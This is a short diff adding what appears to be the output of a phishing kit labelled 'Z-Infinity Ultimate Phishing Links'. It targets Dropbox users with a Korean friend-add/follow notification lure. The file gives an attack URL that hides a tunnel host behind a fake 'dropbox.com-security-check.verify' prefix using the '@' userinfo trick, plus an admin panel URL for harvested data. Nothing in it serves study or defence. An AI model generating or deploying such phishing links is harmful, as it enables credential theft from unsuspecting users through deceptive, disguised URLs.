@@ -1,0 +1,7 @@
+=== v18.0 Z-Infinity Ultimate Phishing Links ===
+Target Platform: Dropbox
+Scenario: 친구 추가/팔로우 알림
+
+[+] Phishing Link (Attack): https://dropbox.com-security-check.verify@6f3bc6ea95f88b3b-59-23-44-194.serveousercontent.com
+[+] Magic Panel (Admin): https://6f3bc6ea95f88b3b-59-23-44-194.serveousercontent.com/YX3ZSvbZYRn9060
+===============================================
